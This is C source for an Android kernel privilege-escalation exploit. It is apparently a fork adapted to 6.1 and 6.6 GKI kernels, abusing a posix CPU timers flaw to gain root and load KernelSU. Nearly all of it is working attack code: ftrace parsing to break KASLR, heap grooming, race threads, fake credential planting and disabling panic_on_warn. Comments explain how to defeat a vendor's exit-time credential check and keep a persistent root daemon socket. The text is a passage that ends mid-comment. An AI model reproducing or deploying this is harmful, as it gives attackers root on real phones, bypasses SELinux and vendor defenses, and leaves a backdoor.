/*
 * ---------------------------------------------------------------------------
 * Linux 6.1 (android14-6.1 GKI) port - this fork
 *
 *   base    : rikumi/TimerRoot native/timer.c (conf driven, MIT)
 *   layout  : every device-specific number lives in --conf (timer_site,
 *             task_cred_off, copy_process_low21, cred_uid_off, ...).
 *             Nothing below branches on the model: supporting a new device
 *             means adding a conf file, not touching this file.
 *   added   : - 6.1 cred layout branch: cred_uid_off == 4 means usage is 4
 *               bytes, so the fake cred is built with the 0xa0 layout instead
 *               of 0xb8 (6.6/6.12).
 *             - fake cred overlays the stale rb_node on purpose (pc == node).
 *               rb_erase_cached() does `leftmost = rb_next(node)`; only with
 *               pc == node does rb_next() return NULL (RB_EMPTY_NODE) and let
 *               cleanup_timerqueue() end naturally. Moving the cred elsewhere
 *               makes rb_next() return the cred address, and the loop erases
 *               it a second time -> panic.
 *             - because pc == node trips WARN_ON_ONCE(RB_EMPTY_NODE), a
 *               harmless "probe" plant is run first (zero write to our own
 *               page) purely to learn the KASLR slide, then panic_on_warn is
 *               zeroed, and only then the fake cred is written.
 *             - miss on the page race no longer aborts the run: the victim is
 *               kept as a held zombie and a fresh victim is tried (3 attempts).
 *             - rootd: after commit_creds() the worker forks a daemon on
 *               /data/local/tmp/rootd.sock (0600, shell) so the root gained in
 *               this boot survives a failed ksud attempt.
 *             - ksu_stage.sh tries /data/local/tmp/kernelsu.ko first, then
 *               ksud late-load with a KMI ladder, and dumps dmesg on failure.
 *             - ksud/libksud.so is located through `pm list packages -f`
 *               because /data/app is 0771 for the shell user.
 *
 *   tested  : android14-6.1 GKI builds (Android 14 OEM ROMs), releases
 *             6.1.141 and 6.1.157; 4/4 plants on the first try, KSU_LOADED,
 *             su in u:r:ksu:s0. Per-device notes: PORT-6.1.md
 * ---------------------------------------------------------------------------
 */
/*
 * CVE-2026-98260 - posix cpu timers: uid-0 shell + KernelSU late-load
 *
 * Upstream head, kept for provenance:
 * Target : OPPO Find X8s PKT110, Android 16 (ColorOS 17)
 * Kernel : 6.6.118-android15-8-g9bc34d5b0c79-abogki537459655-4k
 * SELinux: Enforcing
 * Patches: absent
 * Mitig. : KASLR=on SMEP=on SMAP=on PAN=on; KASAN compiled but disabled
 *
 * Adapted from woshigenm/CVE-2026-98260 (MIT) and the other 98260 ports.
 * PKT110 6.6.118 is a MediaTek android15-8 GKI (NOT Qualcomm 6.12);
 * all symbol addresses, call sites and BTF layouts re-derived here.
 *
 * Two endgames:
 *
 *   default / shell / verify
 *     One zero write to the child's real cred clears uid/gid.  The child
 *     calls setuid(0) and execs sh -> uid 0 in u:r:shell:s0.  This is a
 *     shell-domain root with only the bounding-set capabilities.
 *
 *   fake
 *     Point task->cred at a fake full-capability cred in the reclaimed
 *     order-1 page, then fix uid/gid.  The child forks a worker; fork's
 *     prepare_creds() normalizes cred/real_cred and allocates a real SELinux
 *     blob.  The worker execs ksud late-load, which resolves the installed
 *     manager's libksud.so and loads the matching android15-6.6 module.
 *     The parent parks with its socket buffers holding the fake cred page.
 *
 * The trigger leaves a stale timerqueue node; every failed plant parks
 * without reaping (a reaped uncontrolled node panics this kernel).  Reboot
 * is the only cleanup.  Event ids and the linear-map base are discovered at
 * runtime; the tracefs metadata files are not readable from the shell domain.
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdarg.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdatomic.h>
#include <time.h>
#include <pthread.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/un.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <sys/prctl.h>
#include <sys/resource.h>
#include <sys/stat.h>

#define TR "/sys/kernel/tracing"
#define ROOTD_PATH "/data/local/tmp/rootd.sock"
#define CPU_TRIG 2
#define NTIMERS 4096
#define VICTIM_IDX 2048
#define PREFILL_TIMERS 4096
#define VMA_COUNT 50000
#define HELPER_STACK (1 << 20)
#define LOCKERS 3
#define PAGE 4096UL
#define SOCKBUF 8192

/*
 * Device-specific config, loaded from a HOCON conf file at runtime.
 * Each supported kernel ships one <uname-r>.conf; the app selects the file
 * whose `release` matches `uname -r` exactly.
 */
struct timer_cfg
{
    unsigned long long timer_site;         /* do_timer_create kmem_cache_alloc call site */
    unsigned long long timer_alloc;        /* sizeof(struct k_itimer) */
    unsigned long long cred_req;           /* sizeof(struct cred) */
    unsigned long long cred_alloc;         /* cred_jar slab object size */
    unsigned long long cred_uid_off;       /* struct cred.uid */
    unsigned long long selinux_state;      /* selinux_state symbol */
    unsigned long long panic_on_warn;      /* panic_on_warn symbol */
    unsigned long long task_cred_off;      /* struct task_struct.cred */
    unsigned long long copy_process_low21; /* copy_process task_struct alloc site (low 21) */
    unsigned long long task_alloc_bytes;   /* sizeof(struct task_struct) */
    unsigned long long fullcap;            /* full capability mask */
    unsigned long long root_user;          /* root_user symbol */
    unsigned long long init_user_ns;       /* init_user_ns symbol */
    unsigned long long init_ucounts;       /* init_ucounts symbol */
    unsigned long long init_groups;        /* init_groups symbol */
    unsigned long long selinux_blob_off;   /* task_security_struct.exec_sid */
    unsigned long long selinux_sid_kernel; /* SECINITSID_KERNEL */
    /*
     * vivo 专属（其它机型留空即可，留空就整段跳过）：
     *   vivo_disarm = 1 且 sys_exit_tp 非 0 时，把 __tracepoint_sys_exit 的
     *   funcs 指针清零。vivo 在 sys_exit 上挂了回调，检查退出进程的 cred 是否
     *   刚被改过，不清就会"su 装好了，子进程一跑就消失"。
     */
    unsigned long long sys_exit_tp;        /* __tracepoint_sys_exit (static) */
    unsigned long long vivo_disarm;        /* 1 = zero funcs before ksud */
    char ksu_kmi[64];                      /* KernelSU late-load --kmi */
};
static struct timer_cfg g_cfg;

static void parse_conf_line(char *line)
{
    char *p, *key, *val, *hash, *slash;
    unsigned long long num;

    hash = strchr(line, '#');
    if (hash)
        *hash = '\0';
    slash = strstr(line, "//");
    if (slash)
        *slash = '\0';

    key = line;
    while (*key == ' ' || *key == '\t')
        key++;
    val = strchr(key, '=');
    if (!val)
        return;
    *val = '\0';
    val++;
    for (p = key + strlen(key) - 1; p >= key && (*p == ' ' || *p == '\t'); p--)
        *p = '\0';
    while (*val == ' ' || *val == '\t')
        val++;
    if (!*val)
        return;

    if (*val == '"')
    {
        char *end = strchr(val + 1, '"');
        if (!end)
            return;
        *end = '\0';
        val++;
        if (!strcmp(key, "ksu_kmi"))
            snprintf(g_cfg.ksu_kmi, sizeof(g_cfg.ksu_kmi), "%s", val);
        return;
    }

    num = strtoull(val, NULL, 0);
    if (!strcmp(key, "timer_site")) g_cfg.timer_site = num;
    else if (!strcmp(key, "timer_alloc")) g_cfg.timer_alloc = num;
    else if (!strcmp(key, "cred_req")) g_cfg.cred_req = num;
    else if (!strcmp(key, "cred_alloc")) g_cfg.cred_alloc = num;
    else if (!strcmp(key, "cred_uid_off")) g_cfg.cred_uid_off = num;
    else if (!strcmp(key, "selinux_state")) g_cfg.selinux_state = num;
    else if (!strcmp(key, "panic_on_warn")) g_cfg.panic_on_warn = num;
    else if (!strcmp(key, "task_cred_off")) g_cfg.task_cred_off = num;
    else if (!strcmp(key, "copy_process_low21")) g_cfg.copy_process_low21 = num;
    else if (!strcmp(key, "task_alloc_bytes")) g_cfg.task_alloc_bytes = num;
    else if (!strcmp(key, "fullcap")) g_cfg.fullcap = num;
    else if (!strcmp(key, "root_user")) g_cfg.root_user = num;
    else if (!strcmp(key, "init_user_ns")) g_cfg.init_user_ns = num;
    else if (!strcmp(key, "init_ucounts")) g_cfg.init_ucounts = num;
    else if (!strcmp(key, "init_groups")) g_cfg.init_groups = num;
    else if (!strcmp(key, "selinux_blob_off")) g_cfg.selinux_blob_off = num;
    else if (!strcmp(key, "selinux_sid_kernel")) g_cfg.selinux_sid_kernel = num;
    else if (!strcmp(key, "sys_exit_tp")) g_cfg.sys_exit_tp = num;
    else if (!strcmp(key, "vivo_disarm")) g_cfg.vivo_disarm = num;
}

static int load_conf(const char *path)
{
    FILE *f = fopen(path, "r");
    char line[256];

    if (!f)
    {
        fprintf(stderr, "[-] cannot open conf: %s\n", path);
        return -1;
    }
    while (fgets(line, sizeof(line), f))
        parse_conf_line(line);
    fclose(f);

    if (!g_cfg.selinux_state || !g_cfg.task_cred_off ||
        !g_cfg.copy_process_low21 || !g_cfg.task_alloc_bytes || !g_cfg.ksu_kmi[0])
    {
        fprintf(stderr, "[-] conf missing required fields\n");
        return -1;
    }
    /*
     * timer_site 可选（0.71 起）：
     *   有 —— 用低 21 位在 trace 里认出目标分配，slide = site0 - timer_site
     *   无 —— 退回按 bytes_req/bytes_alloc == timer_alloc 认，slide 由
     *         plant_base 投票出的线性映射基址反推（g_base - PAGE_OFFSET）
     * 两条路都需要 timer_alloc，否则认不出 posix_timers_cache 的对象。
     */
    if (!g_cfg.timer_alloc)
    {
        fprintf(stderr, "[-] conf needs timer_alloc (used to identify the allocation)\n");
        return -1;
    }
    if (!g_cfg.timer_site)
        fprintf(stderr, "[!] no timer_site in conf; falling back to size+base calibration\n");
    return 0;
}

/*
 * vivo 机型才做的收尾动作。三重闸门，任何一条不满足都跳过：
 *   1) 用户在 App 里显式关掉（TIMER_VIVO=0）；
 *   2) conf 没写 vivo_disarm = 1（其它机型的三份 conf 都没有这一行）；
 *   3) 没给 sys_exit_tp，或给的地址不像内核地址。
 * 所以非 vivo 机型跑同一份二进制也不会多发一次写，plant 次数与之前完全一致。
 */
static int vivo_disarm_enabled(void)
{
    const char *e = getenv("TIMER_VIVO");

    if (e && !strcmp(e, "0"))
        return 0;
    if (!g_cfg.vivo_disarm || !g_cfg.sys_exit_tp)
        return 0;
    if ((g_cfg.sys_exit_tp & 7) || g_cfg.sys_exit_tp < 0xffffff8000000000ULL)
        return 0;
    return 1;
}

#define CHILD_HELLO 0x52445931
#define CHILD_MAGIC 0x50474552

struct child_report
{
    int magic;
    int uid, euid;
    int setuid_ret, setuid_errno;
    int ruid, reuid, rsuid;
};

static _Atomic int g_go, g_stop, g_locker_started, g_locker_cpu;
extern char **environ;
static _Atomic int g_locker_need = 3;
static _Atomic int g_exec_enter;
static _Atomic int g_exec_tid, g_target_tgid;
static void *g_frag_base;
static size_t g_frag_len;
static int g_ready_w = -1, g_ack_r = -1, g_tid_w = -1;
static int g_timer_go_r = -1, g_timer_go_w = -1;
static int g_cpu = CPU_TRIG;
static unsigned long long g_base;
static unsigned long long g_slide;
/* mode=4（任意写）要写进去的值；由 stage_write 的调用方设置 */
static unsigned long long g_aw_value;
static int g_held;
static int g_fake_stage;
static unsigned long long g_child_task;
static unsigned g_t_page_alloc, g_t_page_free;

static void logf(const char *fmt, ...);

static void slab_usage(const char *tag)
{
    FILE *f = fopen("/proc/slabinfo", "r");
    char line[256];

    if (!f)
        return;
    while (fgets(line, sizeof(line), f))
    {
        unsigned active = 0, total = 0;

        if (strncmp(line, "posix_timers_cache", 18))
            continue;
        if (sscanf(line, "posix_timers_cache %u %u", &active, &total) == 2)
            logf("[slab] %s active=%u total=%u\n", tag, active, total);
        break;
    }
    fclose(f);
}

static void logf(const char *fmt, ...)
{
    va_list ap;

    va_start(ap, fmt);
    vprintf(fmt, ap);
    va_end(ap);
    (void)fsync(STDOUT_FILENO);
}

static int wr(const char *p, const char *s)
{
    int fd = open(p, O_WRONLY);
    if (fd < 0)
        return -1;
    int r = write(fd, s, strlen(s));
    close(fd);
    return r < 0 ? -1 : 0;
}
static void pin(int cpu)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    sched_setaffinity(0, sizeof(set), &set);
}
static unsigned u32(const unsigned char *b, size_t o)
{
    unsigned v;
    memcpy(&v, b + o, 4);
    return v;
}
static unsigned long long u64(const unsigned char *b, size_t o)
{
    unsigned long long v;
    memcpy(&v, b + o, 8);
    return v;
}

static void enable_events(void)
{
    static const char *evs[] = {
        "enable_event:kmem:kmem_cache_alloc\n",
        "enable_event:kmem:mm_page_free\n",
        "enable_event:kmem:mm_page_alloc\n",
    };
    for (unsigned i = 0; i < sizeof(evs) / sizeof(evs[0]); i++)
        wr(TR "/events/kmem/rss_stat/trigger", evs[i]);
}

static void drain_cpu(int cpu)
{
    unsigned char tmp[65536];
    char path[128];
    snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK);
    if (fd < 0)
        return;
    while (read(fd, tmp, sizeof(tmp)) > 0)
        ;
    close(fd);
}
static void trace_start(void)
{
    wr(TR "/tracing_on", "0");
    wr(TR "/trace", "\n");
    drain_cpu(g_cpu);
    wr(TR "/tracing_on", "1");
}
static void trace_stop(void) { wr(TR "/tracing_on", "0"); }

static long read_cpu(int cpu, unsigned char *buf, size_t cap)
{
    char path[128];
    size_t tot = 0;
    snprintf(path, sizeof(path), TR "/per_cpu/cpu%d/trace_pipe_raw", cpu);
    int fd = open(path, O_RDONLY | O_NONBLOCK);
    if (fd < 0)
        return -1;
    while (tot < cap)
    {
        ssize_t r = read(fd, buf + tot, cap - tot);
        if (r <= 0)
            break;
        tot += (size_t)r;
    }
    close(fd);
    return (long)tot;
}

static int is_kernel_ptr(unsigned long long v)
{
    return (v >> 48) == 0xffffULL;
}

/*
 * Raw ftrace field layout (per-boot ids have no readable metadata):
 *   kmem_cache_alloc: [i-4] pid, [i] site, [i+8] ptr, [i+16] req, [i+24] alloc
 *   mm_page_alloc/free: [i-8] type, [i-4] pid, [i] pfn, [i+8] order
 */
static int scan_timer_allocs(const unsigned char *b, size_t n, int pid,
                             unsigned long long *out, int max,
                             unsigned long long *first_site)
{
    int cnt = 0;

    for (size_t i = 8; i + 32 <= n; i += 4)
    {
        unsigned long long site, ptr;

        if (u32(b, i - 4) != (unsigned)pid)
            continue;
        site = u64(b, i);
        /*
         * 有 timer_site 时用低 21 位当指纹（KASLR 是 2 MB 对齐，页内偏移不变）。
         * 没有时不做 site 过滤，靠下面的 bytes_req/bytes_alloc 认 —— 和
         * scan_cred_allocs 用 cred_req/cred_alloc 认 cred 分配是同一思路。
         */
        if (g_cfg.timer_site &&
            (site & 0x1fffffULL) != (g_cfg.timer_site & 0x1fffffULL))
            continue;
        ptr = u64(b, i + 8);
        {
            unsigned long long req = u64(b, i + 16);
            unsigned long long alloc = u64(b, i + 24);

            /*
             * The dedicated posix_timers cache rounds sizeof(k_itimer) up to
             * its object size, so bytes_req and bytes_alloc are not always
             * equal.  Accept either, bounded; the call-site low bits already
             * pin the allocation to do_timer_create().
             */
            if (!is_kernel_ptr(ptr) || req > 0x400 || alloc < req ||
                alloc > 0x400)
                continue;
            if (req != g_cfg.timer_alloc && alloc != g_cfg.timer_alloc)
                continue;
            {
                static int once;

                if (!once)
                {
                    once = 1;
                    logf("[scan] timer bytes_req=%#llx bytes_alloc=%#llx\n",
                         req, alloc);
                }
            }
        }
        if (!cnt && first_site)
            *first_site = site;
        if (cnt < max)
            out[cnt++] = ptr;
    }
    return cnt;
}

static int scan_cred_allocs(const unsigned char *b, size_t n, int pid,
                            unsigned long long *site_out,
                            unsigned long long *ptr_out)
{
    int found = 0;
    static int dumped;

    if (!dumped && getenv("DUMP_KMEM"))
    {
        int shown = 0;

        dumped = 1;
        for (size_t i = 16; i + 32 <= n && shown < 8; i += 4)
        {
            unsigned long long site = u64(b, i - 8), ptr = u64(b, i);
            unsigned long long req = u64(b, i + 8), alloc = u64(b, i + 16);

            if (!is_kernel_ptr(ptr) || !is_kernel_ptr(site))
                continue;
            /* 只挑像 kmem 记录的：两个 size 都小且非零 */
            if (!req || req > 0x8000 || alloc > 0x8000)
                continue;
            logf("[dump] pid=%u site=%#llx ptr=%#llx req=%#llx alloc=%#llx\n",
                 u32(b, i - 12), site, ptr, req, alloc);
            shown++;
        }
        logf("[dump] shown=%d n=%zu\n", shown, n);
    }

    for (size_t i = 16; i + 24 <= n; i += 4)
    {
        unsigned long long site, ptr;

        if (u32(b, i - 12) != (unsigned)pid)
            continue;
        ptr = u64(b, i);
        if (!is_kernel_ptr(ptr) || u64(b, i + 8) != g_cfg.cred_req ||
            u64(b, i + 16) != g_cfg.cred_alloc)
            continue;
        site = u64(b, i - 8);
        if (!is_kernel_ptr(site))
            continue;
        if (!found)
        {
            *site_out = site;
            *ptr_out = ptr;
        }
        found++;
    }
    return found;
}

/*
 * Same scan without the cache-object-size check: SLUB rounds sizeof(cred)
 * (0xb0) up to the cache's object size, and that value differs across builds
 * (0xc0 on one, 0xb0 on another).  The pid filter already excludes the fork
 * copy_creds record, which carries the parent's pid, so the only remaining
 * match in this window is the exec-time credential.
 */
static int scan_cred_allocs_loose(const unsigned char *b, size_t n, int pid,
                                  unsigned long long *site_out,
                                  unsigned long long *ptr_out)
{
    int found = 0;

    for (size_t i = 16; i + 24 <= n; i += 4)
    {
        unsigned long long site, ptr, alloc;

        if (u32(b, i - 12) != (unsigned)pid)
            continue;
        ptr = u64(b, i);
        alloc = u64(b, i + 16);
        if (!is_kernel_ptr(ptr) || u64(b, i + 8) != g_cfg.cred_req ||
            alloc < g_cfg.cred_req || alloc > 0x200)
            continue;
        site = u64(b, i - 8);
        if (!is_kernel_ptr(site))
            continue;
        if (!found)
        {
            *site_out = site;
            *ptr_out = ptr;
        }
        found++;
    }
    return found;
}

static int scan_task_allocs(const unsigned char *b, size_t n, int pid,
                            unsigned long long *out)
{
    int found = 0;

    for (size_t i = 8; i + 32 <= n; i += 4)
    {
        unsigned long long site, ptr, req, alloc;

        if (u32(b, i - 4) != (unsigned)pid)
            continue;
        site = u64(b, i);
        if ((site & 0x1fffffULL) != g_cfg.copy_process_low21)
        {
            if (getenv("TASK_SCAN_DEBUG") && found < 6 &&
                (site & 0x1fffffULL) >= g_cfg.copy_process_low21 - 0x40 &&
                (site & 0x1fffffULL) <= g_cfg.copy_process_low21 + 0x40)
                logf("[tscan] near site=%#llx low21=%#llx ptr=%#llx "
                     "req=%#llx alloc=%#llx (want %#llx)\n", site,
                     site & 0x1fffffULL, u64(b, i + 8), u64(b, i + 16),
                     u64(b, i + 24), g_cfg.copy_process_low21);
            continue;
        }
        ptr = u64(b, i + 8);
        req = u64(b, i + 16);
        alloc = u64(b, i + 24);
        if (!is_kernel_ptr(ptr))
            continue;
        /* task_struct_cachep rounds 0x1440 to 0x1640 on this build. */
        if (req != g_cfg.task_alloc_bytes && alloc != g_cfg.task_alloc_bytes &&
            req != 0x1640 && alloc != 0x1640)
            continue;
        *out = ptr;
        found++;
    }
    return found;
}

static int scan_page_free(const unsigned char *b, size_t n,
                          unsigned long long pfn)
{
    for (size_t i = 16; i + 12 <= n; i += 4)
    {
        if (u64(b, i) != pfn || (int)u32(b, i + 8) != 1)
            continue;
        if ((u32(b, i - 8) & 0xffff) == g_t_page_free)
            return 1;
    }
    return 0;
}

struct page_pair
{
    unsigned long long pfn;
    unsigned alloc_type, free_type, hits;
};

/*
 * Page event ids are assigned at boot and the tracefs metadata is root-only.
 * Allocate/free anonymous pages and pair the same pfn: first alloc, then free.
 */
/*
 * Page event ids are assigned per boot and the tracefs metadata is root-only,
 * so they are derived differentially here: one run that only faults pages in,
 * one that only unmaps them.  The alloc id is the dominant type in phase 1;
 * the free id is the dominant type in phase 2 that never showed up in phase 1.
 *
 * Pairing alloc/free on the same pfn (the previous approach) silently fails
 * whenever the kernel stops emitting mm_page_free for pcp frees, or emits
 * mm_page_free_batched instead: every pfn then has an alloc record and no
 * free record, and the caller sees "page event ids not found" while the
 * alloc side was in fact captured.
 */
#define HIST_MAX 4096
struct id_hist
{
    unsigned type;
    int cnt;
};

static int hist_add(struct id_hist *h, int n, unsigned type)
{
    for (int i = 0; i < n; i++)
        if (h[i].type == type)
        {
            h[i].cnt++;
            return n;
        }
    if (n < HIST_MAX)
    {
        h[n].type = type;
        h[n].cnt = 1;
        return n + 1;
    }
    return n;
}

static int scan_page_hist(const unsigned char *b, size_t n, int pid,
                          struct id_hist *h, int hn, long *recs)
{
    for (size_t i = 16; i + 12 <= n; i += 4)
    {
        unsigned long long pfn = u64(b, i);
        unsigned order, type;

        if (pfn >= (1ULL << 26))
            continue;
        order = u32(b, i + 8);
        if (order > 10)
            continue;
        if ((int)u32(b, i - 4) != pid)
            continue;
        type = u32(b, i - 8) & 0xffff;
        if (!type || type > 4096)
            continue;
        hn = hist_add(h, hn, type);
        (*recs)++;
    }
    return hn;
}

static unsigned hist_best(const struct id_hist *h, int n, int min,
                          unsigned exclude)
{
    unsigned best = 0;
    int bc = 0;

    for (int i = 0; i < n; i++)
        if (h[i].type != exclude && h[i].cnt >= min && h[i].cnt > bc)
        {
            bc = h[i].cnt;
            best = h[i].type;
        }
    return best;
}

static void log_hist(const char *tag, const struct id_hist *h, int n, long recs)
{
    char line[192] = {0};

    for (int i = 0; i < n && i < 3; i++)
        snprintf(line + strlen(line), sizeof(line) - strlen(line), " %u:%d",
                 h[i].type, h[i].cnt);
    logf("[ids] %s recs=%ld kinds=%d%s\n", tag, recs, n, line);
}

static int discover_page_types(unsigned char *raw)
{
    static struct id_hist h1[HIST_MAX], h2[HIST_MAX];
    int n1 = 0, n2 = 0, me = getpid();
    long r1 = 0, r2 = 0;
    size_t len = 1024 * PAGE;
    unsigned char *m;

    trace_stop();
    wr(TR "/trace", "\n");
    for (int c = 0; c < 8; c++)
        drain_cpu(c);
    m = mmap(NULL, len, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS,
             -1, 0);
    if (m == MAP_FAILED)
        return -1;
    /*
     * Force 4 KiB pages: with THP=always the whole range becomes a couple of
     * order-9 allocations, the histogram then holds two records instead of
     * 1024, and the alloc id never reaches the vote threshold.
     */
    (void)madvise(m, len, MADV_NOHUGEPAGE);

    trace_start();
    for (size_t i = 0; i < len; i += PAGE)
        m[i] = 1;
    usleep(20000);
    trace_stop();
    for (int c = 0; c < 8; c++)
    {
        long n = read_cpu(c, raw, 32u << 20);

        if (n > 0)
            n1 = scan_page_hist(raw, (size_t)n, me, h1, n1, &r1);
    }

    trace_start();
    munmap(m, len);
    usleep(20000);
    trace_stop();
    for (int c = 0; c < 8; c++)
    {
        long n = read_cpu(c, raw, 32u << 20);

        if (n > 0)
            n2 = scan_page_hist(raw, (size_t)n, me, h2, n2, &r2);
    }

    log_hist("alloc-phase", h1, n1, r1);
    log_hist("free-phase", h2, n2, r2);

    g_t_page_alloc = hist_best(h1, n1, 16, 0);
    if (!g_t_page_alloc)
    {
        logf("[-] page event ids not found (alloc recs=%ld kinds=%d)\n", r1, n1);
        return -1;
    }
    g_t_page_free = hist_best(h2, n2, 16, g_t_page_alloc);
    if (!g_t_page_free)
        logf("[!] no distinct free type; spray phases will run together\n");
    logf("[ids] page_alloc=%u page_free=%u\n", g_t_page_alloc, g_t_page_free);
    return 0;
}

/*
 * Vote the linear-map base from the target's timer slabs and same-PID order-1
 * page_alloc pfns.  Partial-slab pairings are noise; the true base wins by
 * roughly one vote per slab.
 */
struct base_slot
{
    unsigned long long key;
    int cnt;
};

static unsigned long long plant_base(const unsigned char *b, size_t n, int pid,
                                     const unsigned long long *ptrs, int nrec,
                                     int *out_slabs, int *out_pfns)
{
    enum
    {
        MAXS = 256,
        MAXP = 512,
        HBITS = 16,
        HSIZE = 1 << HBITS
    };
    unsigned long long slabs[MAXS], pfns[MAXP];
    static struct base_slot tab[HSIZE];
    int ns = 0, np = 0;
    unsigned long long best_base = 0, best_cnt = 0;

    memset(tab, 0, sizeof(tab));
    for (int i = 0; i < nrec && ns < MAXS; i++)
    {
        unsigned long long s = ptrs[i] & ~0x1fffULL;
        int dup = 0;

        for (int j = 0; j < ns; j++)
            if (slabs[j] == s)
            {
                dup = 1;
                break;
            }
        if (!dup)
            slabs[ns++] = s;
    }
    for (size_t i = 16; i + 12 <= n && np < MAXP; i += 4)
    {
        unsigned long long pfn = u64(b, i);
        int dup = 0;

        if (pfn >= (1ULL << 26) || (int)u32(b, i + 8) != 1 ||
            u32(b, i - 4) != (unsigned)pid ||
            (u32(b, i - 8) & 0xffff) != g_t_page_alloc)
            continue;
        for (int j = 0; j < np; j++)
            if (pfns[j] == pfn)
            {
                dup = 1;
                break;
            }
        if (!dup)
            pfns[np++] = pfn;
    }
    for (int i = 0; i < ns; i++)
    {
        for (int j = 0; j < np; j++)
        {
            unsigned long long base = slabs[i] - (pfns[j] << 12);
            unsigned h = (unsigned)((base >> 12) * 2654435761u) &
                         (HSIZE - 1);

            for (int k = 0; k < 64; k++, h = (h + 1) & (HSIZE - 1))
            {
                if (!tab[h].key)
                {
                    tab[h].key = base;
                    tab[h].cnt = 1;
                    break;
                }
                if (tab[h].key == base)
                {
                    tab[h].cnt++;
                    break;
                }
            }
        }
    }
    for (int i = 0; i < HSIZE; i++)
        if (tab[i].key && (unsigned long long)tab[i].cnt > best_cnt)
        {
            best_cnt = tab[i].cnt;
            best_base = tab[i].key;
        }
    *out_slabs = ns;
    *out_pfns = np;
    return best_cnt >= 8 ? best_base : 0;
}

static unsigned long long calibrate_base(unsigned char *raw)
{
    unsigned long long hist[64] = {0}, hcnt[64] = {0};
    unsigned long long recent[64];
    unsigned long long ptrs[512];
    int hc = 0, rn = 0, made = 0, me = getpid();
    long n;

    trace_start();
    for (int i = 0; i < 512; i++)
    {
        struct sigevent ev;
        timer_t t;

        memset(&ev, 0, sizeof(ev));
        ev.sigev_notify = SIGEV_NONE;
        if (timer_create(CLOCK_MONOTONIC, &ev, &t))
            break;
        made++;
    }
    usleep(3000);
    trace_stop();
    n = read_cpu(g_cpu, raw, 32u << 20);
    if (n <= 0)
        return 0;

    {
        int c = scan_timer_allocs(raw, (size_t)n, me, ptrs, 512, NULL);

        for (size_t i = 16; i + 12 <= (size_t)n; i += 4)
        {
            unsigned long long pfn = u64(raw, i);

            if (pfn >= (1ULL << 26) || (int)u32(raw, i + 8) != 1 ||
                u32(raw, i - 4) != (unsigned)me ||
                (u32(raw, i - 8) & 0xffff) != g_t_page_alloc)
                continue;
            if (rn == 64)
                memmove(recent, recent + 1, 63 * sizeof(recent[0])), rn--;
            recent[rn++] = pfn;
        }
        for (int i = 0; i < c; i++)
        {
            unsigned long long slab = ptrs[i] & ~0x1fffULL;

            for (int j = 0; j < rn; j++)
            {
                unsigned long long base = slab - (recent[j] << 12);
                int f = 0;

                for (int k = 0; k < hc; k++)
                    if (hist[k] == base)
                    {
                        hcnt[k]++;
                        f = 1;
                        break;
                    }
                if (!f && hc < 64)
                {
                    hist[hc] = base;
                    hcnt[hc] = 1;
                    hc++;
                }
            }
        }
    }
    {
        unsigned long long best = 0, bestc = 0;

        for (int k = 0; k < hc; k++)
            if (hcnt[k] > bestc)
            {
                bestc = hcnt[k];
                best = hist[k];
            }
        logf("[base] made=%d best=%#llx count=%llu\n", made, best, bestc);
        return bestc >= 4 ? best : 0;
    }
}

static void kick_rss(void)
{
    size_t n = (size_t)32 << 20;
    char *p = mmap(NULL, n, PROT_READ | PROT_WRITE,
                   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);

    if (p == MAP_FAILED)
        return;
    for (size_t i = 0; i < n; i += PAGE)
        p[i] = 1;
    munmap(p, n);
}

static timer_t *g_prefill;

static void prefill_timers(int n)
{
    struct sigevent ev;

    g_prefill = calloc((size_t)n, sizeof(*g_prefill));
    if (!g_prefill)
        return;
    memset(&ev, 0, sizeof(ev));
    ev.sigev_notify = SIGEV_NONE;
    for (int i = 0; i < n; i++)
    {
        if (timer_create(CLOCK_MONOTONIC, &ev, &g_prefill[i]))
            break;
    }
}

static int prepare_fragmented_range(void)
{
    size_t len = (size_t)VMA_COUNT * PAGE;
    int fd = (int)syscall(SYS_memfd_create, "vma-page", 1);
    void *base;
    if (fd < 0 || ftruncate(fd, PAGE))
        return -1;
    base = mmap(NULL, len, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (base == MAP_FAILED)
        return -1;
    for (unsigned long i = 0; i < VMA_COUNT; i++)
    {
        void *want = (char *)base + i * PAGE;
        if (mmap(want, PAGE, PROT_READ, MAP_SHARED | MAP_FIXED, fd, 0) != want)
            return -1;
    }
    close(fd);
    g_frag_base = base;
    g_frag_len = len;
    return 0;
}

static int locker_fn(void *x)
{
    int prot = PROT_NONE;
    unsigned slot = (unsigned)atomic_fetch_add(&g_locker_cpu, 1);
    static const int cpus[] = {1, 3, 5, 6, 7};
    (void)x;
    pin(cpus[slot % (sizeof(cpus) / sizeof(cpus[0]))]);
    while (!atomic_load(&g_go))
        sched_yield();
    atomic_fetch_add(&g_locker_started, 1);
    while (!atomic_load(&g_stop))
    {
        syscall(SYS_mprotect, g_frag_base, g_frag_len, prot);
        prot = prot == PROT_NONE ? PROT_READ : PROT_NONE;
    }
    _exit(0);
}
static int killer_fn(void *x)
{
    int tid, tgid;
    (void)x;
    pin(2);
    while (!(tid = atomic_load(&g_exec_tid)))
        sched_yield();
    tgid = atomic_load(&g_target_tgid);
    for (;;)
    {
        long r = syscall(SYS_tgkill, tgid, tid, 0);
        if (r < 0 && errno == ESRCH)
            break;
        sched_yield();
    }
    syscall(SYS_tgkill, tgid, tgid, SIGKILL);
    atomic_store(&g_stop, 1);
    _exit(0);
}
/*
 * 5.15 的 exec_mmap 与 6.1 不同：
 *
 *   6.1 : mmap_read_lock_killable(old_mm)      <- 致命信号直接 -EINTR
 *   5.15: mmap_read_lock(old_mm);               <- 不可打断
 *         if (old_mm->core_state) return -EINTR;
 *
 * 所以在 5.15 上唯一能让 exec 在 posix_cpu_timers_exit 之前失败的注入点是
 * old_mm->core_state。它只在 coredump_wait() 里被设置，并且会一直保持到
 * 所有共享该 mm 的任务全部退出（wait_for_completion(&core_state->startup)）。
 *
